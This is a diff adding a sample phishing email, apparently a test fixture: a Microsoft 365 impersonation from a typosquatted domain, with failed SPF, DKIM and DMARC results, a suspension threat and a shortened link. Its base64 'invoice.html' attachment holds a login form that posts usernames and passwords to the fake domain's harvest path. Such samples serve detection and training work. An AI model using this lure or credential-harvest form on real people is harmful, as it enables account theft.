@@ -1,0 +1,46 @@
+Return-Path: <bounce@micros0ft-verify.com>
+Received: from mta-mail.suspicious-host.ru (mta-mail.suspicious-host.ru [45.142.214.99])
+	by mx.victim-corp.com (Postfix) with ESMTPS id A1B2C3D4
+	for <user@victim-corp.com>; Mon, 18 May 2026 14:22:11 +0000 (UTC)
+Received: from sender-relay.micros0ft-verify.com (sender-relay.micros0ft-verify.com [185.220.101.42])
+	by mta-mail.suspicious-host.ru (Postfix) with ESMTP id Z9Y8X7W6
+	for <user@victim-corp.com>; Mon, 18 May 2026 06:20:01 +0000 (UTC)
+Authentication-Results: mx.victim-corp.com;
+	spf=fail smtp.mailfrom=micros0ft-verify.com;
+	dkim=fail header.d=micros0ft-verify.com;
+	dmarc=fail header.from=micros0ft-verify.com
+Message-ID: <CAJ7xy.2026051814.abc123@micros0ft-verify.com>
+Date: Mon, 18 May 2026 14:22:10 +0000
+From: "Microsoft 365 Security" <billing@micros0ft-verify.com>
+Reply-To: <attacker@protonmail.com>
+To: user@victim-corp.com
+Subject: Urgent: Verify your Microsoft 365 account
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="boundary42"
+
+--boundary42
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+
+<html>
+<body>
+<p>Dear Customer,</p>
+<p>Your Microsoft 365 account will be <b>suspended in 24 hours</b> due to unverified billing information.</p>
+<p>Please verify immediately: <a href="https://micros0ft-verify.com/login?u=user">Click here to verify</a></p>
+<p>Or use this shortened link: <a href="https://bit.ly/3xK9aZQ">https://bit.ly/3xK9aZQ</a></p>
+<p>Support: <a href="https://legit-cdn.net/tracker.gif">legit-cdn.net</a></p>
+<p>Thank you,<br>Microsoft 365 Security Team</p>
+</body>
+</html>
+
+--boundary42
+Content-Type: text/html; charset="UTF-8"
+Content-Disposition: attachment; filename="invoice.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwczovL21pY3JvczBmdC12ZXJpZnkuY29t
+L2hhcnZlc3QiIG1ldGhvZD0iUE9TVCI+PGlucHV0IG5hbWU9InVzZXIiLz48aW5wdXQgbmFt
+ZT0icGFzcyIgdHlwZT0icGFzc3dvcmQiLz48YnV0dG9uPlNpZ24gaW48L2J1dHRvbj48L2Zv
+cm0+PC9ib2R5PjwvaHRtbD4=
+
+--boundary42--
